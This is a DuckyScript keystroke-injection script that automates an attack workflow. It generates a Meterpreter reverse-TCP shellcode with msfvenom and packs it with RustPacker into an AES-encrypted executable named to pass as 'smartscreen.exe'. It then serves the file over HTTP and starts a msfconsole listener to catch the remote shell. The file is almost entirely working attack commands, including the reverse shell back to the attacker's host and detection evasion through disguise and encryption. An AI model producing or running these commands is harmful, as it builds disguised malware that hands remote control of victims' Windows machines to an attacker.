REM runs Windows Server
REM Install rustpacker for 

DEFAULT_DELAY 200

REM Init
GUI t
DELAY 500
STRINGLN set LOCAL_IP (ip addr show | awk '/inet / {print $2}' | cut -d'/' -f1 | sed -n '2p')
STRINGLN mkdir -p /tmp/ducky/
STRINGLN cd /tmp/ducky/

STRINGLN git clone https://github.com/Nariod/RustPacker.git
WAIT_FOR_BUTTON_PRESS
STRINGLN cd RustPacker/

REM Write Shellcode
STRINGLN msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LOCAL_IP LPORT=3000 EXITFUNC=thread -f raw -o shell.bin
DELAY 6000

REM Pack shellcode
STRINGLN cargo run -- -f shell.bin -i ntapc -e aes -b exe -t smartscreen.exe -o /tmp/ducky/windows
WAIT_FOR_BUTTON_PRESS

REM cleanup
STRINGLN rm shell.bin
STRINGLN cd ../

REM Start serving
STRINGLN echo $LOCAL_IP
STRINGLN python3 -m http.server 8080

REM Start Listening
GUI t
DELAY 500
STRINGLN set LOCAL_IP (ip addr show | awk '/inet / {print $2}' | cut -d'/' -f1 | sed -n '2p')
STRINGLN msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost $LOCAL_IP; set lport 3000; exploit"
